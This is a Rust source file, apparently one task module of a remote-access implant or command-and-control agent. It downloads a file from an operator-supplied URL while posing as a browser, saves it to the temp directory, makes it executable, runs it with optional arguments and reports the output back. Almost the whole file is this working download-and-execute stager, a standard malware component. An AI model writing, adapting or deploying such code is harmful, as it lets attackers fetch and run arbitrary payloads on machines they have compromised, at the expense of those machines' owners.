/// Package loader: download from URL, save to disk, optionally execute.

use super::TaskResult;
use std::io::Read;

pub fn run(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let url = match args.get("url").and_then(|v| v.as_str()) {
        Some(u) => u,
        None => return TaskResult::error(task_id, "missing 'url' argument".to_string()),
    };

    let save_path = args.get("path").and_then(|v| v.as_str());
    let execute = args.get("execute").and_then(|v| v.as_bool()).unwrap_or(false);
    let exec_args = args
        .get("args")
        .and_then(|v| v.as_str())
        .unwrap_or("");

    // Download file
    let response = match ureq::get(url)
        .set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .call()
    {
        Ok(r) => r,
        Err(e) => return TaskResult::error(task_id, format!("download: {}", e)),
    };

    let mut data = Vec::new();
    if let Err(e) = response.into_reader().take(100 * 1024 * 1024).read_to_end(&mut data) {
        return TaskResult::error(task_id, format!("read response: {}", e));
    }

    // Determine save path
    let target_path = match save_path {
        Some(p) => p.to_string(),
        None => {
            // Extract filename from URL or use temp path
            let filename = url
                .rsplit('/')
                .next()
                .unwrap_or("download.bin")
                .split('?')
                .next()
                .unwrap_or("download.bin");

            #[cfg(target_os = "windows")]
            {
                format!(
                    "{}\\{}",
                    std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string()),
                    filename
                )
            }
            #[cfg(not(target_os = "windows"))]
            {
                format!("/tmp/{}", filename)
            }
        }
    };

    // Write to disk
    if let Err(e) = std::fs::write(&target_path, &data) {
        return TaskResult::error(task_id, format!("write file: {}", e));
    }

    let mut result = format!("downloaded {} bytes to {}", data.len(), target_path);

    // Execute if requested
    if execute {
        #[cfg(target_os = "windows")]
        {
            // Make sure it's executable
            let exec_result = if exec_args.is_empty() {
                std::process::Command::new(&target_path)
                    .stdout(std::process::Stdio::piped())
                    .stderr(std::process::Stdio::piped())
                    .spawn()
            } else {
                std::process::Command::new(&target_path)
                    .args(exec_args.split_whitespace())
                    .stdout(std::process::Stdio::piped())
                    .stderr(std::process::Stdio::piped())
                    .spawn()
            };

            match exec_result {
                Ok(mut child) => {
                    // Wait up to 30 seconds
                    match child.wait_with_output() {
                        Ok(output) => {
                            let stdout = String::from_utf8_lossy(&output.stdout);
                            result.push_str(&format!("\nexecuted (exit: {})\n{}", output.status, stdout));
                        }
                        Err(e) => result.push_str(&format!("\nexecution wait error: {}", e)),
                    }
                }
                Err(e) => result.push_str(&format!("\nexecution failed: {}", e)),
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            // Make executable on Unix
            let _ = std::process::Command::new("chmod")
                .args(["+x", &target_path])
                .output();

            let exec_result = if exec_args.is_empty() {
                std::process::Command::new(&target_path)
                    .stdout(std::process::Stdio::piped())
                    .stderr(std::process::Stdio::piped())
                    .spawn()
            } else {
                std::process::Command::new(&target_path)
                    .args(exec_args.split_whitespace())
                    .stdout(std::process::Stdio::piped())
                    .stderr(std::process::Stdio::piped())
                    .spawn()
            };

            match exec_result {
                Ok(mut child) => match child.wait_with_output() {
                    Ok(output) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        result.push_str(&format!("\nexecuted (exit: {})\n{}", output.status, stdout));
                    }
                    Err(e) => result.push_str(&format!("\nexecution wait error: {}", e)),
                },
                Err(e) => result.push_str(&format!("\nexecution failed: {}", e)),
            }
        }
    }

    TaskResult::success(task_id, result)
}
